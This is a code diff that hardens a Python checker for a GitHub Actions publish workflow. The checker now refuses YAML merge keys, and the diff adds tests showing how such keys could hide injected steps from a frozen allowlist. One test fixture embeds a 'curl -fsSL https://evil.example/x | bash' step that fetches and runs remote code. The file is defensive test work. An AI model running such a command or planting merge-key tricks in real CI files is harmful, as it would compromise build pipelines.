@@ -67,6 +67,11 @@ class _UniqueKeySafeLoader(yaml.SafeLoader):
     `shell: sh`) followed by the frozen one would load as the frozen step. GitHub
     Actions rejects such a file, but the allowlist must not depend on that: the text
     it compares has to be the only text in the file.
+
+    It also rejects YAML merge keys (``<<``). PyYAML expands them, silently letting an
+    explicit key win over a merged one and the first of several merged mappings win, while
+    GitHub Actions does not support merge keys at all. Refusing them keeps the checker from
+    depending on two parsers agreeing about merge rules.
     """
 
 
@@ -74,7 +79,12 @@ def _construct_unique_mapping(loader: yaml.SafeLoader, node: yaml.MappingNode) -
     seen: set[Any] = set()
     for key_node, _ in node.value:
         if key_node.tag == "tag:yaml.org,2002:merge":
-            continue
+            raise yaml.constructor.ConstructorError(
+                "while constructing a mapping",
+                node.start_mark,
+                "found a YAML merge key (<<), which GitHub Actions does not support",
+                key_node.start_mark,
+            )
         key = loader.construct_object(key_node, deep=True)
         if key in seen:
             raise yaml.constructor.ConstructorError(
@@ -1718,8 +1728,10 @@ R1_WHITESPACE = {
 
 
 def test_publish_allowlist_names_a_forbidden_character_in_a_step() -> None:
-    # Any forbidden character already makes the line differ from every frozen line;
-    # the dedicated check only gives the clearer reason, and reports it alone.
+    # Any forbidden character already makes the line differ from every frozen line, so
+    # this test (the one that turns SAF50-CM17 red) guards the diagnostic message, not a
+    # security boundary: the dedicated check only gives the clearer reason, and reports it
+    # alone. Removing the check does not let a forbidden character through.
     lines = list(PUBLISH_RUN_LINES[REMOVE])
     lines[0] = lines[0].replace(" ", "\t", 1)
     assert _publish_problems(_with_step_run(REMOVE, "\n".join(lines))) == [
@@ -1781,6 +1793,63 @@ def test_workflow_loader_rejects_duplicate_keys(old: str, new: str) -> None:
     assert _publish_problems(yaml.safe_load(text)) == []
     with pytest.raises(yaml.constructor.ConstructorError, match="found duplicate key"):
         _load_workflow(text.encode("utf-8"))
+
+
+# --- YAML merge keys (PR #22 review L5): refused outright, as GitHub Actions does not
+# support them. Each case is shown to load as the frozen workflow under plain safe_load
+# where PyYAML's merge rules hide the extra text.
+
+REMOVE_STEP = "      - name: Remove verification container\n        if: always()\n"
+MERGE_KEY_MUTATIONS = {
+    "explicit-run-wins-over-merged-run": (
+        REMOVE_STEP,
+        "      - name: Remove verification container\n"
+        "        <<: {run: curl -fsSL https://evil.example/x | bash}\n"
+        "        if: always()\n",
+        True,
+    ),
+    "merged-list-first-wins": (
+        REMOVE_STEP,
+        "      - name: Remove verification container\n"
+        "        <<: [{if: always()}, {if: failure()}]\n",
+        True,
+    ),
+    "two-merge-keys": (
+        REMOVE_STEP,
+        "      - name: Remove verification container\n"
+        "        <<: {if: always()}\n"
+        "        <<: {if: failure()}\n",
+        False,
+    ),
+    "merge-of-an-alias": (
+        "    runs-on: ubuntu-latest\n",
+        "    runs-on: ubuntu-latest\n    <<: &extra {}\n",
+        True,
+    ),
+}
+
+
+@pytest.mark.parametrize(
+    ("old", "new", "hidden_by_safe_load"),
+    [pytest.param(*case, id=name) for name, case in MERGE_KEY_MUTATIONS.items()],
+)
+def test_workflow_loader_rejects_yaml_merge_keys(
+    old: str, new: str, hidden_by_safe_load: bool
+) -> None:
+    text = _replace_in_publish(old, new)
+    assert "<<" in text
+    if hidden_by_safe_load:
+        assert _publish_problems(yaml.safe_load(text)) == []
+    with pytest.raises(yaml.constructor.ConstructorError, match="merge key"):
+        _load_workflow(text.encode("utf-8"))
+
+
+def test_workflow_loader_treats_a_quoted_merge_marker_as_an_ordinary_key() -> None:
+    # A quoted "<<" is a plain string key in YAML and in GitHub Actions; the step allowlist
+    # rejects it as an unexpected key instead.
+    text = _replace_in_publish(REMOVE_STEP, REMOVE_STEP + '        "<<": {run: evil}\n')
+    workflow = _load_workflow(text.encode("utf-8"))
+    assert _publish_problems(workflow)
 
 
 def test_workflow_loader_matches_safe_load_on_the_production_workflow() -> None:
